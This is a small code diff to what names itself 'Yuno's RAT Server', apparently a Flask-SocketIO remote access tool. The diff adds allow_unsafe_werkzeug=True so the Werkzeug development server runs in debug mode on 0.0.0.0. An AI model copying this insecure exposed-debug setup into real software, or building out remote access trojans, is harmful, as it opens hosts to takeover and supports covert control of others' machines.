@@ -147,4 +147,4 @@ def handle_request_client_info(sid):
 if __name__ == "__main__":
     print("=== Yuno's RAT Server ===")
     print("A remote access server by Yuno\n")
-    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)
